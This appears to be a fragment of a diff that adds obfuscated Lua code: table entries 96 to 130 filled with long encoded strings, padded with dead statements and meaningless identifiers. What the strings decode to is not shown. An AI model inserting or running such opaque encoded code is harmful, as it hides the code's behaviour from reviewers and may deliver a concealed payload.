+_lGHIJKLMNOPQRST_0oabcd[96]='47/uvuDq7v3l8ue5/tHN8+Hx58nvv9Lu5t7l8/zRve387r/Z/7/t7sDTv9n60qDc5tHMzMrfvPvB4NLM5aTpweTZ0uOy47+g+fzN2/u9v/77+OXEyfjq/uDq78nO6r/RzeTNw77l5eO93+X+5Ornuc3+5uPk6szMsuO+uP7Z5v3H4M252f7p89rT5cHm6sPZ3+Dg2bPY0bnY7+2g5O+97aT/78H94OXRudrNycn65tvtu+Xj+fvD89n/veb7vdGg6Onv28f5zLn47b25zuno49nkzO3vvL3z37O94/rR6fP9+qDBsvnpwcrZzNzi2L/js+i9w/7Svf395aT+376guPLuvMHD4L/m37i8zKT95ea68+r97O7qyb7g4MnA0+qg//3RpOP5vaC8+ee5'
+_lGHIJKLMNOPQRST_0oabcd[97]='zeCz7uegvcz+3ubBuvvmw/ny4KDH+s7J//7quP/94P7/vM7J3/PNw/Hkv9nv/NLjvv3DwezozMPb5O3Bud++oP3k7tG72sPJwN/m3M7pzNHh+u3cuqC85uTY6czN++/MvvnDzL7g7f7o6u3zuPjq+8n/6ua4++rMxO/MxMTuvrjl+sO5uerD5uXszszE0tHJ/eSguee75cHt+u3ZpP7lybL5zv657uq4uPnmxNnzw9O96r+gyfnDyb3e6bng7ebB4fnmvrry6ePhs8PJzeS+pLPe0bnh/um5oN7quOjZ4My68uDJ+NPuweGy0cn7+urR4/zM5cP657mg2cz+7bjNxOG47rnA2NKg+aDNzPm95cHE2dHJ2t7o3Nv9zMO73rPc4O7qw/zevcHl4KTZ'
+_lGHIJKLMNOPQRST_0oabcd[98]='8t7RzO+47v3D/+7m5u7D3PH/0vv7pMzcs9jlzOW+s9n7v8y52b68ye/j58ztsu7Z4fjmuePl6NHA7r6gsvu/0bvtzr7j+L3J576949n56u7y6OnR3+G+wfzZzaTv4rzRw/nSyfmk5vPhsu652/rtueTa0cP62dHb6NHDwfzv6tni37246OrMyaDa6fPn5dKg+73S+/u9s/7voL3D8+Sk+9mzzPva0aD9zt7m5aDqztzK0uXJ5tnnuPn/7/Pt8b3MpOK9uejTvb676s3Evv+847npzcnl/NG5+f3Rw7zlvMn+7r654bjvoOPszNHB+qDE/+DvueO+76Tf47/R57zM2cnizvv+6OX7473npO3/7b7h/+7l4bPq++Oy58m508O55+Tvw7PfvqD/+e3u'
+_lGHIJKLMNOPQRST_0oabcd[99]='2t7p0cn65aDnvbzj/7/NpNjp5ubv++nm+tO9xMf77rnM2MzB2/rq06T67e7u77zjx+Pp3LL456S72czz47/M+7z40tG/7eb7w//npMn+58G85b2gwtHM5vm85sOg7r7MzfvD7t/x576+4Oig5tHSzNjes/vn+73J2/vM5aDovNHJ7OrByezM5vLu0cH43umg2unt+8La6sns6ODZ37PmoNro6u3B+bzj7eXlueG7vO7E2L7B5u29oNrp0aTj+r/7+O3g0d/45aC6/eDMztG/zMPjv9yy+ebzs9i849v9vcTE6c3E+fvRw+/l6u26uO7jx+Dp3OPlvfug7dHJzu/Mub/e7fvn5efz5N7l+9rq0aS8+uXR4NPq87vp6NHC6ubmyeDlweLfvczg7tHE'
+_lGHIJKLMNOPQRST_0oabcd[100]='3+TqxMzqzczfs+bE7eTq88f5vqTN476+4fqyxPra6vv/7OrD++C9w9v56rnD+ODm+f292+/95ePb/s7R2Njm/dn+5sGz0urmx/q/++3/zcz/+83z5f/O3OX6zcH7oLzz4fLDyeOy59vtuNHE4urmoPH9zuPa6b3mztO+vtjesqC77dLjv9rpoPv5zszb++nJ//vt8+G8zsz9/ubj77+g28reoNvM0+654+Xp5v7e0dvy2L6g37jD4+zRztns3tLM4aTS/v3l5v6y/uXm7eSg2eDf4Nzfv7PcpP2/3Pv5zcPk3tHE7O7M/vjTpOPvsszt377vw779vNOz2Omg4NPRufjp0cna0uDj/+Wgw7vvzu7a2urj/+Hg+/rt6tzj5eru8t+/yfP9vMGz6NLm'
+if IIGHIJKLMNOI_XYZabcdefghi1~=_1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx then else end
+if IIGHIJKLMNOI_XYZabcdefghi1 then I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno=38 end
+_lGHIJKLMNOPQRST_0oabcd[101]='4/PnpOP556DJ+dL+u969vtrSzLnN+rzZ4O/mwd+k5cH5vr/jw/rmw6TlpO68/c7curPM7sHlvvPk2bzBu9Pmudjt6eby2c2kve7pwdrqvMHY6dLmvOXm8/ro0vvO3qTB8+zRub7+57m/2urjzf3M08fhv9mk/r3t/6Dg7vLS6rm+5MPc8/3SoLLl57jy6b3EuuC87rzj0aTg6c7+zeTM26T5vqCk+qDm/Oqk7uG7v+b+0sy52fnSvsf75tm/0+2++u/g7trt5vvo6u3cvOLm+7r7ztG56ubB//7pzOOz4Nmy4r/Z/eTmufm7zv7g2ebE/77M4+XgoNPM6szj8tLD0bLg5dn/+NGgytGz7vLYvfu50cy4/NK9/fjpw/vO6s7Zvenm8+Tv5b7k0aS5'
+_lGHIJKLMNOPQRST_0oabcd[102]='2eLq5r/p4NnM6eDc4N/m3M7Y5dOk48P7+b/q/v3s6u7x/uDRwOjm29mkv+bK7dK+zeK83Pjv6qC76qTmsv7p4/Hjw8n/veD+5bik3O7pzPPH+rKg+unp2e/kv9yk7Oqg/fq/2eP96cm+++m54+XSyc36s+PJ/byg+OrOzPP7pPvh4OXZ+eLSvuG/7sHK6NG4x/295uTt6bn//sy+zt7D0drqoMyk4+rJv9HmuaT7zOO4+ObM/tnD2eWyvNHa3rLB6N7qzOXkvczjvsPuzeTlycLSpO7hv9HE2aDSyePkoNnB/uDZ76Tq5vm75/P+7737uPjN2/u8vOPg0s3Mwf7q2aT66vP60r/+2N+8xPn5zLjf4tLMudm+uL3epObB4uqgwNPRoO/z6v7y7+m+'
+_lGHIJKLMNOPQRST_0oabcd[103]='/NHMzKT+5v3Y2L3j2f/Dvrno4Ob5/sPz4bvSvqTlvLnJ4tLZweXqw+Gk0r7b/c7mwfvO0d/gv8z7/+r+w+TRxMfi6cHD+M7u2Nnm/sH6zqDy2b3uwtnmoNjuvsHA0u25pOPN27j7vPP/89Lms+qyxNjo6aDx/b7zuqC+pM7e7sTD/b/MwOnM2b/t4O7i7czu4/nDzPv9vdvm7b/Z2/7DzMP6zvvv+9LM2/i8xPLpvNy/6rK57/u928Lu6cnO3tLjvertufP9vtvh/c3J2f7Oye2z58Og2Omg4Om//v3lv/7E0cy4svu/+/jp0cHm7unz7//Nye/j6szJ5enE/f/p89ru5szh7NLZ+fO8xMn+6ebN5O+52/jN2+Pi58n58um+zf2/3Mf96vPj87/c'
+_lGHIJKLMNOPQRST_0oabcd[104]='yeXMubL+5cz7/dLM2tLlxMn/0uPx5Obj4/i92eek5tuk+tHEw+DgybL+4ObA0b65weLMxNrq6Oa4++nBurO/7sDe6ubj8b/R2/3p7sH9zL7y09LJ4Nm+oNrpzNny7b7EwePloO2z4O7b+tHM/f68ueLp4P7g37zZ4/q/++39zszZ+u+g5O+/yf395tO50efM773p5tn5zNHjvuXR8+W/vsro6cz75M3bzfnM0f+46rnM2c3Dzfvp0b7k0snK6rO+6Nrqvrnp6cG6+eXms9nq/eX5zNnf5Onm2eW9xLr+vPPj5Ojmzf/g+8ztv+6g7efDvOWz3PHlw77v++DZ2eG92++4sqDD++64w+Xt0fP7pMzo7cPc+73RuN/l6O79++XE2NrR8/P7s76y+uq4'
+_lGHIJKLMNOPQRST_0oabcd[105]='wt/nw/3ivMT/vqDJ46Tq0+27zKDm08zE2fnM+++g0aT7+OX+2OrnzMDY6uPk78zDwO2/yejq6f696enmw+LM4+7u0aTg6u25zN7o2drp4NG73qTjs9O//vjv5rjZ+77zpPvp86DY0u7s0+b+7NHgoLvYzO7tu73t+O+8++/kw6Dt+9Lc8f3goPrS59vvu+rj7O3q0+f96tPA3uXu+7vq5fLYvL7l5dG47by9zKDe6u75vb7zvP/D+/7vzMTnoOnRsuzO2czSssTvu73MzOjn8/3/76DfvOjMv+2/3NrT5uXA3urb2//M/vPl7/P75LzR8fug2cPjvObz+u377+C946DqvsnN4+DJ6OjnpOG70fP67dLJ36Tp7vu/7sy8/7zm2ti93Pug0qC72bzz'
+_lGHIJKLMNOPQRST_0oabcd[106]='6O7l87nTs9zi773bzeLnxPrvzMT60erM/NLovuHyve66s+mg/Nm+weLqpNGz082+xNHu8/+776DD+czb2u3D88P9ztn74MzluOTuoOP9vfP62b/j5+C9/cP75sTj4eeg+NOzyeO4vcH/5enz2/q95uH76szj+szR5Oqyw7L5v9zy3+eg37K+w7/o0bjE2szt4bPRuO7o5vu64OnB+NrM48zezr7M782+xO/poOjv6bnZ5Ob7+6S+yfn+zv7h4LLzwtLRpO39zNm6vO774biyuPzessn95O3+3+O8weP77eb+3rPJuuHnvvjp58n78r+g/ui85sn40tn748PJ2eTq+6T4zO3jv+fBztrS3Nnksr6++bzJ++LSoNn56sTi7c7Jx+Du5uPivNmy/urz'
+_lGHIJKLMNOPQRST_0oabcd[107]='x/rM3PH55dnH/unB/+Lqyfu9pNG57rzzztPM0//xvPv5+6DB2eK9zP/46sHz5M3z+b7DyfzYvtvf+Ob97O7MyfzZw+O/0cPMs+28udnlw9nf/M3J6O3p2ePi6qD/vO3j2O/S3L3o4Nzb/dK++b6/3Mrqs+7D5Obz7fnl2eDTvNPO0tHMwf69zPP/zr746ue+x+TM3PHsw9nK7em+/76//snkzMzs7b7MxOnS7uW47dzt/cPTpOW/zOGgztn/+s7Z/+PqufH+vszk0s7M4+W87sfi6rmy5dHbzeDvyfvjzMH/+6DRwf/O2ef6w8n/+urJ+eDM27r67eP75OC+37jmvvLRzsy+4LPM5/7S/sn9w+PO0rPmyf6+yfnjvMHj5enR/N7pzOjo5bnjv+W5'
+_lGHIJKLMNOPQRST_0oabcd[108]='2tLqxLL90cHE6eDjoO+92fP9zu7+3qDt8/uk2c346bn/v+rzx/nO3PH4ztnE777J/NLp0ef6zcTl4r/J/ePlwfn66dzB4MPZwunD/rvY5sHY3tHM8+Tp2c7pw9no3r2gzNrquPHs6u3tvuXJ5Ojq0cf7zu7x+OXz4O/poOX65b692c6guuLq5uf/6tvl8unzpOTu+7rs0cGg2Obc2fi9/rLk6rnh+r/u++W8udjRztH8783b5+Xvwc7tzLjJ/+Dmv9m9/b75w/Pz4+bB7NnOoMf55rnZ8r3+7/3p/qDS0czu7r25wf/Nw9rY0fPH+6TZ7ujm/bna0r7o0+mgpPvq8/3k5snf8tHJs+nmxNrRzOW56Or97b7u7cng5cnE0+q+zujM28LZvaDa0sPE'
+_lGHIJKLMNOPQRST_0oabcd[109]='//jM2f3k5ua6sr++yfq/7qDT6v2+5c2k2tHnueHy6bmk+8ztvuzD49jp6cHC7+a5/O7RzPrT58z78ry5yt7t8+fgoLjK0tK+4bPNzMPgstv/u6DM5/qkoOe7pKC93uXT2+XS5rnR6bmz7ubbzti8ufLTvtvfu9HJwfnuvr76pPPm0eDusv7l7rPZv9z9/uqg/fjg2b/RpP778urB5tHRpOTZ5snD5b3D/tGk++fg0vvD5MzD5/LMueP+ve7//72g/uqg8/7RvbnZ+76456Tp4+Tpvbig2efz5Oi+2/m4pP7v+tLJ+bO83OjTzMzN4sO+xNO8yeXszOPE0tLR4/nl+8Hj0cP54ebM8t7pvr7kw/PK3u64+7u93PLpw/Pl4O3Z3+Lq+9+zzO7ZuOC+'
+_lGHIJKLMNOPQRST_0oabcd[110]='37Lq0b7lv+6+5KDM77POvsn56tGz2ur92f/vpP374My70cPMvP7S/uO+oNzY7b/JvuDSvu/yvcnfs9HM7bvO+/P4vdu76r3toN7goNnl7tnB+qDZ7/Ll8+3j0aTz+e+g+/rnxPng6ubA77zBxNi//vre0du72NHJ+//u7cDe0czC3urj4/Lp2fH4zP2z773m4/vM3Mf67bnnuMyg4u7l3N+zzOX5u7yg6NPq+77j6ebs2MPz8tHl4+7Tw/Ps2OXM4eXu5fH96v7u2cy46Njq7sfl0fPlvOrDpPjp08rqzOb5oOXJue7nud/yzcnY0tHz47PO/vmyw8HtoODMoNK83LnS0aTE2uq+urzNxLPq5tPb4+b+6OrmzLnqvsy8+eXM7bjp/vHloPPC7+i+'
+while false do break end
+do LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ=IIGHIJKLMNOI_XYZabcdefghi1 or 923 end
+_lGHIJKLMNOPQRST_0oabcd[111]='5uqg+83l0tyz6dGgs+m+oO3lvNP58bzRwf7D0f3g7cHo0bLB7f69yf7R0ubz4NHb+fvDufzo5b7npL37xOng4+P+0tHy0+C+4bzq3P3kzNHs6tGk5fHnyeTessnE0b7J/trqwebYw9zY7b+gyfm/7u/szcPE7sPB7aS8oMrZv9zj+eek2Ni/vsf70cn607PM4t6k0fHj0r7C7ry+5/PNucDuvOPjuOrZ77zpxP/54NHZ++nMuOSy28n7s+7tu8Og8ui//sTtvcm4+9Hb4+XSoOjZ5ubt7OnEzfm9/uH86e7k0erD2fvlxMn46tvA6r7DzNPDudvgv+7E6b3t7eTq8/3+vOP5vuC+7fO93Mn65dPg0b/m+fnp0br4vNnl+er+s+q9uezazcPm2L39'
+_lGHIJKLMNOPQRST_0oabcd[112]='+Onm7ejvzMzD4OXTwui87uX9zu7t+6DB+Orqwdnl6vv7+L/M+b3OoM7e5v3O7en7+Nrpybvuv+7toOnZ5+Sk2bqgztnZ/ua5/NO889n45fvt4b3D2trMoNjS5tug2b3MytO+ydv6zaD80+Xz8u3R89rpzaTA6e/M+OrquOHizu7A6b7J4Om93Mnk4OPK07/Mx+zp887S7cTB4ubRuvi8wezfvLnl4eDR3+Cz++jv0b6y5KDE7O3D2brh5u2z2urDs96kxPzo0ty6+b/mx+O+weGkzMHN5cPmwfq8yeO/5tPtoL3Ju9nM0+X50cz+7by5/NHm++zo0qD/5Mzz4N7o2b7jw/7O6Mz+/tPm2cru0v7z+enzsvvp883+vqTv4825u+3q0crYvLni6MzJ'
+_lGHIJKLMNOPQRST_0oabcd[113]='x/7lud+4w+7Y0sPJw+G9/vjR5czfs8PMsuDMzOH9vbnt+czR4Orp+/uyw8my5b/J2tK8yb/YzMG6/8P7x+DM2cLYvL7j4Myg8tKkxMrS5czD/erZztPN887ZzPPz+ebc+O3mvuTYveO8/9G46NHM2eP9vf7a3rzT4eC80efs0vv60b7EuOLloP7p5cy+5aDu2fq/7vrq6u7f/c3bzf3q0/jY4O7i2OrM8eXNoLPRvOak++r94OrS4/7qsrjv4+rl2tjq5uOyvO7z5ODjzOnm+7vu6bn5veX++OrnpKT9w+bt47y5+/K//vHk6f647OnBuvno5r3vvqCy+8Pz7/rSoOf95r7J+u64ztm95fn5zczj89Lu8t7NoPvj4KDz4r3Buvi8yePz5dztve7z'
+_lGHIJKLMNOPQRST_0oabcd[114]='5f7M0eP56ePl4b/mudm84/rq0b7v8+b92NK9yc3/0tm70urjpP6927q85qC/2OnR2/rpoOjS58yk+L3T8t/gzL/fvNy8+c6g+eLp4+Xg4P7J+urJzNO95snivqC96rPMpP7Sycni6sG+4ODM6NGkwaTgzszz4Mzz4O/goOPk6qDl4KTTzNHOoLPt5bn5v8Pc7b3m88P6zPPs7bz77f/uue3/w9Gg6ebZ3+zS3Pu9oNzjv+nBweXpoL750bnb47/csuzS4+7u5tv+37++7f/l3MH658nl+cP72+LgzPjR56DH4O3csuzSzOf95cn5u6Dm5N+9yaDS0qDk2NLMyfrqxM3/vOag2Omg+6C+pODS7ubH5OruzeLR86T9w+Pb/b6+xNm92b7l0fPC0enR'
+_lGHIJKLMNOPQRST_0oabcd[115]='4/3M7sPjw+a64rzZ3/3p0c7SzcTa7b3+5f3SzOX5vszy0+bmx/vNzNnlvfPi6bzRzujnxPH9veO65byg2eLS7uDS4KDt+uWgwtm/5v3l6P7B5eq5/ujq4//+w+bO0+ru4OnooM7S0u7b4unM5Ojq8/LYv+7H7Om+x//OzMfs6fuz0r3Mzu7gzMf7vcGk4765+/rt8+DY5f7h4r3M2/vq7efiv/7J+tLM5eDq8/zSvL7h88y+yfnu48nl5sznvOrMsvjlzOW46b7H/8252fzpueDovP7l+MzT8/nlzPH40r6/2eXJ4NrqufHjzLno6eDZzfnDzO/s6fO/6u7R4//u3MDS6sPD+ub77/2/5vP+0tzfoOfEx+PMoMHh4Pvn47zE4+XO3KT6stvx/dLu'
+_lGHIJKLMNOPQRST_0oabcd[116]='5ezD5vjR0vuk+8ztx/7DoOPk6dna2s2gwujmzMf55cm707Lz//qgyfzq79vY6NLM7NrDuef56tuk+6Db2fnm/bvp7sHZ/tHzweHnycnl5sG76e7E7N6gzMf9vdv947y5v+nm/t/k6e7B++rZyezMvsni6v692tKg3/jlwcrR0v77u+rc++Tt7r774KDfstLZ4NjNyfP/76DN++ncweXvyb3tvOPfpMzlwtLqoNmgzOP7/+rD7eO+zLj56OPhs9HD2eWypPzS4Oa8+u/b6N7Nufnk7dzM0tHz+bjqvtnkvtu++6Djue7DwbrgoPPjuLKgsuLl3Lj+6tznpL/c7tLRubLjveaz0c7m5tOk4+H95rj40ebZzfi9ye/6zsyk+szcuerM7tv5veXnoOa+'
+_lGHIJKLMNOPQRST_0oabcd[117]='2Nnl7sHi6dHt5aTu3/vu/fzR5ub78+fz4+Pp/v367vu/06Du4fvg7v39vsHu6cy4+tG87r7l7tnn8rzmve/gye2+6czi0+rEwN6g2+2zzMTY79GgpOTN87j7zszb5M6+yf7q8+296dPz+eDm+u/u/eDqs/7nvuX+6OnO++2/4L66vMy44O/Svtjt5sOk+tLJvODOzL7gveb5u+bc+tjq3Mf66rnl/+e+zfrMvuekv77b/sPm4NG/oMH9vcnv5aDZ8+G92drSzcHm0bzu4tnM+7ntvduy4M7c+eW8vuzvve7s6r3+zf6/47vRvcn40efb8/69+8P7w7nH4Obc2/jl48Tpw7nA2LzT6Ni80djR0cG44L/cztng0fPk5uPB+e7c+/6+w/u/w/v+3r/R'
+_lGHIJKLMNOPQRST_0oabcd[118]='ytPO2fm8zNvu6uig+fi95r/vvOO6vu7T7/LS3O/8zL7M7enR/f6948H77cTh+c3M3/K8/uP+zNG76sPzyeLnoPP7vbj80b3Mve683Nv/w8n43r7E6NjSycPi5sH7++nmsvm98/vl5v7+7s3EpPi95cDSvvP/vs7+/7vu/tm8zczO0+njs+3O0dja6tHa0eXE3/m+waT+5v3K6rK42fm+w7zj0uPZ48zbpOXl0eH458Hh5OfD4N7RuO3gv+PO79GkwOrS/qDZvb7v/MO+2/3l07vY0u7l/M6+/fvt87vtzubJ5dLM8unpzPv96sTD+ejZ5u3M7cTuzMHC7cPM5tnNoO3z5cnJ/+65+eLRpM7T5v3Y2L3T7bu/7s7R0v66+OXMvOXDvs7Zw8za2Om+'
+_lGHIJKLMNOPQRST_0oabcd[119]='8eK/4+Gyv8nO3u3jyeLO0bvt6e7i2dLZv+jl0eDTzu7J/r25uqTpyeju0b77s8zcu9LRzOeg0v7/uMzEpPrquP3jzOPO0uXB4b7t2fmyzNzH+erZyfvloPnx4ObZ/er7wu3p3KDZv/7z7MzExO7OzPrS6v3B/b/M+OjO0eP45tGg0czz3+Lp+7j7w+7J5KTuwezS+8LZ5cS+4Onu4+Tu2f376cH95Orm2ePm2bnRzNzz/uDuyfq/vs7uzqD55ODuuuPRwdm/v77Z+uW57fm+zL7i0ubj5dL+wfrp7uP46dPb4OfB/7684/jTw/7b5em+pOTq7fP+v9y+5Onu/NKyyfH55rnnvuDMuv/O3Oe86Oa97b39uv/RycH56bnn88PcuP3p887a6b7g0b3j'
+_lGHIJKLMNOPQRST_0oabcd[120]='2/vNzL/t6uPz5M6gw/vlufHg7v2k4b3bw/3O3OP5v8nn4b65uv29/cng6fv9/c7J7+Sk+8P4vqDl+b/Zyfq8vqT/v6DD+cPZpOK97vP46czv4Oe+2/nNoOPk6szy37/Ryfi9ycrYvdvt4+a+2b/m3L3q4L7H4r3Ms+rpxMng0qDn+OXz8eXu2cn46tv5u6Sg++DvzOH45fvj4uX7vv3m5rLlzNvC6czZ8+LmzOHk58zN4OD7+eWyoPP50r7D4sPm4/jg0eP4zMO4+NHJ+bvvue/67tvA2b/M7bPqvsHjw9zn+qDEvOPD7ujYzubA0u3m7+DvpMH+zczs0e+58u+9ue37vczl+urb2/m+pPvjv9Ht/bzjwujnwfjq0tnb+s7m3/ru/aDo5qD86by5'
+do local _=686 end
+do local _={96,54}end
+do local LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ=860 end
+while false do break end
+_lGHIJKLMNOPQRST_0oabcd[121]='zu3M5sf7zaTN+unMzf282fv/zaDJ++rc4N68waT/zNy93uXRzOq/zNmg6ePt5L65svm85qT+zczi7b65++C/oL767v3f+6TEvdPpxPn9vKDnuL3b+tPp0/3j58nns73b8tOyvu2kzMHz4LzB5f/mvuP66Pvhs+ek+eK83MLY6aD807zj77PS49+yzuaz3rLB2NKg7fLRvO7D4ufD+/7MzNni58PO6u+g77Pg3OH40u7f8eDR77i+oOzov/uz78zl3/PNuNnxvbjD+ubT2N7Nw+/56tng0e+5urLS3LPq7f7C08PB+bLm3O/xvOb7oNHB+/Lquf3k0dvi2tHJ4+C+w8razMPE0ua+w/29uOXszu7h7Myg//PM/ue+vNy6v+7Bv+rqxMzT0qDA0qDJ'
+_lGHIJKLMNOPQRST_0oabcd[122]='v+6/7qDS6tH97Mz7+6DnvuHz0tzM2ebm/Oqg2f/k6sznu9LZudPvuMLYvfvfuO25wN7lxOO4srn94Onm6NHR8+/96cSz2OfD2aDnycTq6e7/v+3jxO2926DqztzN+uaguuPNvvjSoLjZ8ur9vuTm0e3/58HD4sPB2tPm/uH457mk/encvv695vm/zObH+c7j5fO90c7T6ty92s3z4t+84+X7oNvf4ufb5aTS0fv95dPx/erBx/qz+7rx58G6uOjM/eXD8+jRv+Pl473R47i+uLLjzsz87+XjxNO807j7ve3Y7sz7+eCy8/m/s/7luL25//+9/uDS6dHz/9L+2u/o+8rY4NHi0b++2ujR287Y6r7f/+e5yu68+/jqoNztvuq5wOrtoMrv0cGy++XR'
+_lGHIJKLMNOPQRST_0oabcd[123]='wtnMub7i6tvfsue+7/6+zMng4NnB/+X+wtLM7rr+5ubk6ufE5eXm+7j/6KDk6e+kue7g5tmz6cHloOXT7aTmueP5w+P74L+gwO/S7v+zvaC4+9HByf/q0cze6fPA3sPj/Ni+ufm9pNny0+rRxO3S+/rv7sHf4tLZ7u7gybL56dyz7+fJsuTNwfP57fu50c258eDpxMzu5dno2tHJ573q7sf/7tv7vtHJoOjN28re0dvi3+ekvPq97fLT6ubH5eq57tjR87Pezubfu+nE4//l5rPSvLm57tGg+eDSvuX9vfv74urb+by9xOLRvMno3uXJsuDM7sTt5ubo7tLjyeTO2b7/57nvvL/uoNnO2ejTssH7uO+g7b/Oyfmz5dH5uL++u+rq/cP/4L7B4L3j'
+_lGHIJKLMNOPQRST_0oabcd[124]='uPvS/rjjvL672erz4NHg0eP/6szz/+jm772kvuHg5ePB+s77wOnOzOfz4NHh4Orl8tPo4+Dfv9Hz5aTBx+G80/zSs9y8/urT2NO+yfH6zNv5/tHzoOntuf/95sTg0dLcs9Gg++Hl76D/ve+58/jn2++4vdzY7ee+4bPS5sDY6v747+e+5O3l2eX5vsPhvcygpOLl88DTw/vl5O/z77igwe/76O7u6szb3+K8oOTRzMPm0ur+2N6+ue7u5ebk6czR8u29/vnj5ebt+ubbxOnu873S6sm++ub9oOq83Ozu6uO53uag/u+9+/rp6dzA6OC+zO7l/qT6oPPM3qS+2fHm5crZ6sTC7sPz+bjv8/P5zObD4+ncwu2/oP/+5uO44O3c4fG8vrj50tnjvs2g'
+_lGHIJKLMNOPQRST_0oabcd[125]='4NHDybrhvf7m0e255urO7uW44P66/uD7suXvyaTk7cno6dHE+bPp3MrtzMPi7r/Z7NHSyc7YzMnu08zJ+t7S2f365rj75b3J/7y8ye3kv6D9/cOg2fHg/uTa0snz+6CguuLmxPnz0smy+b/JpP/l0bLloNzz+6TZve/S7trpvNnD/czZ37juoPu8zNHt89Luyum8xPHkvriz06TZud7pwcre4Pvt48774O7Mw+Tu5sPb+6T74//vue3lv77y2en+oN+9oM7v5tzC3u3++fLpvuP86tzk2b3M5Oqk5szfvNnfvurR7bLSydmy6tPv5efBzNLD87j70dvy7+bJudGz0fHlw+bg0ubuur+k3MLq7snhvb/uzf/O5rno5uaz3u7+ur3quO/yzdv7/+Xm'
+_lGHIJKLMNOPQRST_0oabcd[126]='3+K+ycP76u3B5enmzu7O2eX57tnv/8Pu5tPNufns6u68/byg+Oi9yeW70snO6ubzpPnMuP+gw7762enZ5ezNwd/4vsy44uDm4tOg5vzpzMz5vr2+/tLo/sH4vPPju+fb+/vqwb7szu6z3u3j3+Tt/rqyve7H+b3uve7m7rLhv+7h4ubT4tPquLjs6tHD5c3B7aC8oMLYztny0+XR57/g0eTo4Pu56Ly+7/283MPhvdHx/+DJuv/m7briv9Hz4OnT2u/uoO/g6fv46eWg3+XvoMru6tm6oODj5/K9ucP90r7f+6Tm7f/vw6TjzObn++7uu9LRoOX/6O7g0sz+3/jp7rzjzszY09Lcve/SyfLtvcmk+eXZ4eCk89/5zv650u6g6O7pweLS6uPfu73j'
+_lGHIJKLMNOPQRST_0oabcd[127]='vv/t0+XloOXj4L3c7/3OoMH5w9Pj5MPTuv3g+9resrn82eW55/Lnvvu4pNP+0r7M47i9uO++pMnl+6Dm+u/ovubevdz607zB5NHqzP37srnvoL3m2fu+w+zRvNH+7ebRvd6yw8TYw/vv4OrZ+Ojm883456DD+erT57i87tv/5sSz0+e48ti+xMH7s6C8+Lzc4tLn86T6vPPB/c2g7eXu/u+95e7Zvrzcv9O9vtv5vdP7+cz7/u3n88f57fv8787cud7tudn9zL7Zv+774O/l0eezvKDz+rPR+urRxL3tvszO6sz92NHRzMzo6sPf+qS5+eSk/sDe5uW90u2+2OrSyfLYv77hsub7x/vv88n+ve3B48PJ+/vt0eP5vMHD4M3E8eS9/srS7tz+0+rt'
+_lGHIJKLMNOPQRST_0oabcd[128]='5eG9uOjR5cH5/+7l2+zMwcLSzcTM7bzEu9G/+7q+vOP7/eD+5fPMzMLe7ePu0urt/u+8vqTk57697+ig8/3M7u7T7fu6/8O+uvnO2bq75tyg772g4/jmwePgzMz9/umg8t7quOGz6uXvvunRpOPnw7rkpPvvvOfE8+W+xPH46uXm6uq+7eHm0/rZ6cmg2s7+zujq2e36vrm8+u+4/frm2/++6KDj4+nEwOjm0d/zw77D+MO58fvM0b3u6cnm6e7Jx/3moOzt4KDm2dHMsuPquLLkvbik/ubzv+jDvufl5ri73ubj6NrMw/n44L7A7rzMx+TuxLrlzPPx4ubmvvq9/f7e5uPs6u7m7NKy8+Wg0ubv+qD+oN7lvv39vcTK6sPR2eK/7ujo6f7n+en+'
+_lGHIJKLMNOPQRST_0oabcd[129]='4fjqvtje6dnM0+rB4f7RubPTsqDi7ubRx+Pnub7/59vfv+DjsvvquOzSs+bv5eeguvrMw9/z6cT/vszj4bLO4/jtzcm84OnZ4frM7f3i6dyy7MzJ+bLm3Lvtvsy72Ofb4NjS5ujZ5fvk7sPzvPu9xP7uzqDvu82kzeG87u/l7ubx+ubDsvvgvtv55fvt4eW+/fq/3Mztw+ak4ebJwf7MuL/a6sG++uru+7vp8+/kw+7f+ubJ8uq8yb7kw+P7pL/j7b6+yeXkvaDvuOi+vP3O2b76w9Ho7czJ5eDNw/v7w8mk4NG+wezM2c7S5ubm2c6+4eXpxOf+57nZ4NG5v+3R28zpzNntu+fMudHmw//57v3Z+u2g8/m82djqve7H5e2+uvPS+/u97vvf+7/J'
+_lGHIJKLMNOPQRST_0oabcd[130]='+7PD3P7S6cmy7M7JwNLt7sTu5tvb4LzuwtjD/qT6zOO+4OnZ36C+ubzloOXl4+XB+fvRxOP40r7n8sz9oOjM0b/S4Nzk6czJ+/uk7uG9vdvl5On+2+zqyeG+zaTJ++m55/vvvr767v395Ofz7u/m2bjj6tH40sO+8/nO+7rzzcH87r/cs+jO/vrp0bn5u82557zt/vHk6dG97+rjzeWg4/++oO3o6Oa48f/v87PRoMHh/dLjvvvu5e35zfPi2cPJ2b3p48TY4Mzk7cO+/N7MzNm7oMPN5eDM8frD0d/67vPi3sPB5eDu89jR6v7H/73l5tPm5brgvqD5/765x+TmoOP+6eb//ebtpPntucDpveXj+uXc7//t7vv7zcm44r25w+To2dvlpMG6v7yg'
+do _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno or 468 end
+repeat until true
+repeat until true
